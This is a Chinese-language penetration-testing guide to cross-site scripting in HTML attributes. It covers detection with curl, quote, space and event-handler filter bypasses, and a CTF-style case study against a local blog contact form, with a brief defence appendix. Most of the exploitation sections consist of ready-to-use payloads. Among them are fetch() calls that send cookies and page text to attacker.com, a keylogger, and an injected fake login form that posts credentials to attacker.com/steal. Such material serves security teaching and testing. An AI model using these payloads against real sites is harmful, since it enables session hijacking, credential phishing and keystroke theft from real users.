# **HTML 属性上下文 XSS 注入**

**文档说明：** 本文档提供 HTML 属性上下文 XSS 漏洞的系统化检测与利用方法，重点针对 value 属性、src 属性、href 属性等 HTML 属性中的用户输入反射场景。

---

# **第一部分：文档概述**

## **1.1 编写目的**
- 为渗透测试人员提供 HTML 属性上下文 XSS 测试与利用的标准化流程
- 帮助理解不同 HTML 上下文中 XSS 的注入技巧
- 提供属性逃逸、事件处理器注入等高级利用技术

## **1.2 适用范围**
- 适用于用户输入反射到 HTML 属性 value/src/href 的场景
- 适用于属性值未使用引号包裹或引号未过滤的场景
- 适用于 CTF 挑战、渗透测试项目中的 XSS 漏洞利用

## **1.3 读者对象**
- 执行渗透测试任务的安全工程师
- 负责代码审计的开发人员
- CTF 参赛选手

---

# **第二部分：核心渗透技术专题**

## **专题：HTML 属性上下文 XSS 注入**

# **2.1 技术介绍**

**漏洞原理：**
HTML 属性上下文 XSS 是指用户输入被反射到 HTML 标签的属性值中（如 `value`、`src`、`href`），且未进行适当的编码或过滤，导致攻击者可以注入恶意 JavaScript 代码。

**本质：** 应用层代码将用户输入作为 HTML 属性值输出，未遵循"数据与代码分离"原则。

**常见漏洞代码模式：**
```php
// 漏洞代码示例 - 属性值未编码
<input type="text" name="email" value="<?php echo $_POST['email']; ?>">
<input type="text" name="name" value="<?= $name ?>">
<img src="<?php echo $_GET['image']; ?>">
<a href="<?php echo $_GET['url']; ?>">Link</a>

// 安全代码示例 - 使用 htmlspecialchars 编码
<input type="text" name="email" value="<?php echo htmlspecialchars($_POST['email'], ENT_QUOTES); ?>">
```

**常见 HTML 属性上下文：**
| 属性 | 标签示例 | 风险等级 |
|------|---------|---------|
| value | `<input value="USER_INPUT">` | 高 |
| src | `<img src="USER_INPUT">` | 高 |
| href | `<a href="USER_INPUT">` | 中 |
| action | `<form action="USER_INPUT">` | 中 |
| data-* | `<div data-info="USER_INPUT">` | 中 |

# **2.2 攻击常见于哪些业务场景**

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **表单回显** | 表单验证失败后回显用户输入 | value 属性未编码 |
| **搜索功能** | 搜索关键词回显 | value 属性未编码 |
| **图片展示** | 用户上传图片 URL | src 属性未编码 |
| **链接生成** | 用户提交外部链接 | href 属性未编码 |
| **URL 参数传递** | 隐藏字段传递状态 | value 属性未编码 |
| **CTF 挑战** | 表单输入反射 | value 属性未编码 |

# **2.3 漏洞探测方法**

## **2.3.1 输入点识别**
- 抓取所有与后端交互的请求，重点关注表单提交后的响应
- 常见参数名：`name`、`email`、`search`、`query`、`url`、`image`

## **2.3.2 初步探测**

**步骤 1：基础测试**
```bash
# 提交简单测试数据
curl -X POST http://target.com/contact \
  -d "name=TestUser" \
  -d "email=test@example.com"

# 检查响应中是否反射输入
curl -X POST http://target.com/contact \
  -d "name=TestUser" \
  -d "email=test@example.com" | grep "TestUser"
```

**步骤 2：探测引号过滤**
```bash
# 测试双引号
curl -X POST http://target.com/contact \
  -d 'name="test"' \
  | grep 'value="'

# 如果返回 value=""test""，说明双引号未过滤

# 测试单引号
curl -X POST http://target.com/contact \
  -d "name='test'" \
  | grep 'value="'
```

**步骤 3：确认漏洞存在**
```bash
# 测试事件处理器注入
curl -X POST http://target.com/contact \
  -d 'name=" onfocus="alert(1)" autofocus="' \
  | grep 'value="'

# 如果返回 value="" onfocus="alert(1)" autofocus=""，漏洞存在
```

## **2.3.3 白盒测试**
- 代码审计：搜索 `value="<?php`、`value="<?=`、`src="<?php` 等模式
- 检查是否使用 `htmlspecialchars()` 或 `htmlentities()` 编码
- 检查编码是否正确（ENT_QUOTES 标志）

# **2.4 漏洞利用方法**

## **2.4.1 双引号属性上下文逃逸**

**场景：** `<input value="USER_INPUT">`

**Payload：**
```bash
# 基础 Payload - 属性逃逸 + 事件处理器
" onfocus="alert(1)" autofocus="

# 完整利用 - 数据外带
" onfocus="fetch('http://attacker.com/?data='+btoa(document.body.innerText))" autofocus="

# 完整利用 - Cookie 窃取
" onfocus="fetch('http://attacker.com/?cookie='+document.cookie)" autofocus="
```

**利用示例：**
```bash
curl -X POST http://target.com/contact \
  -d 'name=" onfocus="alert(1)" autofocus="' \
  -d 'email='

# 响应中将包含：
# <input type="text" name="name" value="" onfocus="alert(1)" autofocus="">
```

## **2.4.2 单引号属性上下文逃逸**

**场景：** `<input value='USER_INPUT'>`

**Payload：**
```bash
# 基础 Payload
' onfocus='alert(1)' autofocus='

# 如果单引号被过滤，使用 HTML 实体
&#39; onfocus=&#39;alert(1)&#39; autofocus=&#39;
```

## **2.4.3 无引号属性上下文逃逸**

**场景：** `<input value=USER_INPUT>`

**Payload：**
```bash
# 使用空格逃逸
test onfocus=alert(1) autofocus=

# 使用 Tab 逃逸
test	onfocus=alert(1)	autofocus=

# 使用换行逃逸
test
onfocus=alert(1)
autofocus=
```

## **2.4.4 src/href 属性注入**

**场景：** `<img src="USER_INPUT">` 或 `<a href="USER_INPUT">`

**Payload：**
```bash
# javascript: 协议
javascript:alert(1)

# data: URL
data:text/html,<script>alert(1)</script>

# 事件处理器（如果允许）
" onerror="alert(1)"
```

**利用示例：**
```bash
# img src 注入
curl "http://target.com/show.php?image=javascript:alert(1)"

# a href 注入
curl "http://target.com/link.php?url=javascript:alert(1)"
```

## **2.4.5 高级利用 Payload**

**凭证窃取：**
```bash
" onfocus="var d=document.createElement('div');d.innerHTML='<form action=http://attacker.com/steal method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>';document.body.prepend(d)" autofocus="
```

**页面篡改：**
```bash
" onfocus="document.querySelector('h1').innerHTML='HACKED';document.body.style.backgroundColor='red'" autofocus="
```

**键盘记录：**
```bash
" onfocus="document.addEventListener('keydown',function(e){fetch('http://attacker.com/log?key='+e.key)})" autofocus="
```

# **2.5 绕过方法**

## **2.5.1 绕过引号过滤**

**过滤规则：** 过滤双引号 `"`

**绕过 Payload：**
```bash
# 使用反引号（现代浏览器支持）
` onfocus=`alert(1)` autofocus=`

# 使用 HTML 实体
&#34; onfocus=&#34;alert(1)&#34; autofocus=&#34;

# 使用 URL 编码
%22 onfocus=%22alert(1)%22 autofocus=%22

# 使用 Unicode 编码
\u0022 onfocus=\u0022alert(1)\u0022 autofocus=\u0022
```

## **2.5.2 绕过空格过滤**

**过滤规则：** 过滤空格

**绕过 Payload：**
```bash
# 使用 Tab 代替空格
"	onfocus="alert(1)"	autofocus="

# 使用换行代替空格
"
onfocus="alert(1)"
autofocus="

# 使用/代替空格
"/onfocus="alert(1)"/autofocus="
```

## **2.5.3 绕过事件处理器过滤**

**过滤规则：** 过滤 onerror/onload/onfocus 等

**绕过 Payload：**
```bash
# 使用较少见的事件处理器
" onanimationstart="alert(1)"

# 使用 onpointerenter
" onpointerenter="alert(1)"

# 使用 ontransitionend
" ontransitionend="alert(1)"

# 使用 ontouchstart（移动设备）
" ontouchstart="alert(1)"
```

## **2.5.4 绕过 autofocus 过滤**

**过滤规则：** 过滤 autofocus

**绕过 Payload：**
```bash
# 使用 onclick（需要用户交互）
" onclick="alert(1)"

# 使用 onmouseover（需要鼠标悬停）
" onmouseover="alert(1)"

# 使用 onanimationstart+CSS 动画
<style>@keyframes x{}</style>
" style="animation-name:x" onanimationstart="alert(1)"
```

# **2.6 实战案例**

## **案例：Encoder64 Blog 联系人表单 XSS**

**目标：** 利用联系人表单 name 参数的 HTML 属性上下文 XSS

**步骤 1：识别漏洞点**
```bash
# 提交测试数据
curl -X POST http://localhost:36367/contact.php \
  -d "name=TestUser" \
  -d "email=test@example.com" \
  -d "message=Test"

# 检查响应
curl -X POST http://localhost:36367/contact.php \
  -d "name=TestUser" \
  -d "email=" \
  -d "message=" | grep -i 'name="name"'

# 返回：<input type="text" name="name" class="form-control" value="TestUser">
```

**步骤 2：测试引号过滤**
```bash
# 测试双引号
curl -X POST http://localhost:36367/contact.php \
  -d 'name="test"' \
  -d "email=" \
  -d "message=" | grep 'name="name"'

# 返回：value=""test"" - 双引号未过滤
```

**步骤 3：注入 XSS Payload**
```bash
# 注入属性逃逸 Payload
curl -X POST http://localhost:36367/contact.php \
  -d 'name=" onfocus=alert(1) autofocus="' \
  -d "email=" \
  -d "message="

# 返回：
# <input type="text" name="name" class="form-control" value="" onfocus=alert(1) autofocus="">
```

**步骤 4：数据外带利用**
```bash
# 启动监听服务器
python3 -m http.server 8888

# 注入数据外带 Payload
curl -X POST http://localhost:36367/contact.php \
  -d 'name=" onfocus="fetch('"'"'http://localhost:8888/?data='"'"'+encodeURIComponent(document.body.innerText.substring(0,200)))" autofocus="' \
  -d "email=" \
  -d "message="

# 受害者访问时，页面内容被外带到 attacker.com
```

---

# **第三部分：附录**

## **3.1 常用 Payload 速查表**

| **上下文** | **Payload 示例** | **说明** |
| :--- | :--- | :--- |
| **双引号属性** | `" onfocus="alert(1)" autofocus="` | 属性逃逸 |
| **单引号属性** | `' onfocus='alert(1)' autofocus='` | 属性逃逸 |
| **无引号属性** | `test onfocus=alert(1) autofocus=` | 空格逃逸 |
| **反引号绕过** | `` ` onfocus=`alert(1)` autofocus=` `` | 引号过滤绕过 |
| **Tab 绕过** | `"	onfocus="alert(1)"	autofocus="` | 空格过滤绕过 |
| **HTML 实体** | `&#34; onfocus=&#34;alert(1)&#34;` | 编码绕过 |
| **数据外带** | `" onfocus="fetch('http://attacker.com/?d='+document.cookie)" autofocus="` | Cookie 窃取 |
| **页面篡改** | `" onfocus="document.body.innerHTML='Hacked'" autofocus="` | 页面修改 |

## **3.2 事件处理器参考表**

| **事件处理器** | **触发条件** | **利用难度** |
| :--- | :--- | :--- |
| onfocus | 元素获得焦点 | 低（配合 autofocus） |
| onclick | 元素被点击 | 中（需要用户交互） |
| onmouseover | 鼠标悬停 | 中（需要用户交互） |
| onerror | 资源加载失败 | 低（配合<img src=x>） |
| onload | 资源加载完成 | 中 |
| onanimationstart | CSS 动画开始 | 低 |
| ontransitionend | CSS 过渡结束 | 低 |
| onpointerenter | 指针进入元素 | 中 |

## **3.3 利用决策流程图**

```
                    ┌─────────────────┐
                    │  发现输入反射   │
                    └────────┬────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │  确定反射上下文 │
                    │  HTML 属性/Body  │
                    └────────┬────────┘
                             │
                ┌────────────┴────────────┐
                │                         │
                ▼                         ▼
        ┌──────────────┐          ┌──────────────┐
        │  HTML 属性     │          │  HTML Body   │
        └──────┬───────┘          └──────┬───────┘
               │                         │
               ▼                         ▼
        ┌──────────────┐          ┌──────────────┐
        │  检查引号类型 │          │  标签注入    │
        │  双引号/单引号│          │  </textarea> │
        └──────┬───────┘          └──────┬───────┘
               │                         │
       ┌───────┴───────┐                 │
       │               │                 │
       ▼               ▼                 ▼
┌──────────┐   ┌──────────┐     ┌──────────────┐
│ 引号未过滤│   │ 引号过滤  │     │ 标签逃逸     │
└────┬─────┘   └────┬─────┘     └──────────────┘
     │              │
     ▼              ▼
┌──────────┐  ┌──────────┐
│ 属性逃逸  │  │ 编码绕过  │
│ onfocus  │  │ HTML 实体  │
└──────────┘  └──────────┘
```

## **3.4 防御建议**

**服务端防御：**
```php
// 正确编码输出
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// 或使用 ENT_HTML5 用于 HTML5
echo htmlspecialchars($user_input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

**客户端防御（辅助）：**
- 实施 Content Security Policy (CSP)
- 设置 X-XSS-Protection 头
- 设置 X-Content-Type-Options: nosniff

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用技能：** injection  
**关联 OWASP Top 10：** A03:2025 - Injection
